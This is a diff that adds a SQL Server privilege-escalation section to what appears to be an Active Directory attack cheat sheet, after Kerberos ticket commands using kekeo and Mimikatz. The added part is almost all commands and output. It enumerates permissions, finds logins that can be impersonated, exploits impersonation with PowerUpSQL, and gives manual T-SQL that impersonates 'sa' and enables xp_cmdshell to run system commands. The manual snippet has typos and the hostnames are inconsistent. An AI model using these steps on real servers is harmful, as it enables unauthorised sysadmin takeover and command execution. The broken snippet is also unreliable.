@@ -267,6 +267,48 @@ PS C:\ad>  kekeo.exe "tgs::s4u /tgt:TGT_someservice@US.MARVEL.LOCAL_krbtgt~us.ma
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.marvel.local@US.MARVEL.LOCAL_ldap~UFC-DC1.us.marvel.local@US.MARVEL.LOCAL_ALT.kirbi"'
 
 ```
+### SQL Server Escalation
+Enumerate permissions:
+```
+PS C:\> Get-SQLQuery -Instance $instance -Verbose -Query "select * FROM fn_my_permissions(NULL,'SERVER')"
+VERBOSE: MVU-SQL.us.marvel.local : Connection Success.
+
+entity_name subentity_name permission_name
+----------- -------------- ---------------
+server                     CONNECT SQL
+server                     VIEW ANY DATABASE
+```
+Check impersonation possibilities
+
+```
+PS C:\> Get-SQLQuery -Instance $instance -Verbose -Query "select distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
+VERBOSE: MVU-SQL.us.marvel.local : Connection Success.
+
+name
+----
+sa
+dbuser
+```
+Impersonate using PowerUpSQl
+
+```
+PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance $instance -Verbose -Exploit
+VERBOSE: UFC-SQLDev.us.funcorp.local : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
+VERBOSE: UFC-SQLDev.us.funcorp.local : CONNECTION SUCCESS.
+VERBOSE: UFC-SQLDev.us.funcorp.local : - Logins can be impersonated.
+VERBOSE: UFC-SQLDev.us.funcorp.local : - dbuser can impersonate the sa sysadmin login.
+VERBOSE: UFC-SQLDev.us.funcorp.local : - EXPLOITING: Starting exploit process...
+```
+Manualy:
+```
+EXECUTE AS LOGNIN ='sa'
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+exec sp_configure 'xp_cmdshell',1
+RECONFIGURE
+EXEC master..xp_cmdshell 'whoami'''
+
+```
 
 ## Presistance
 ### DC Sync
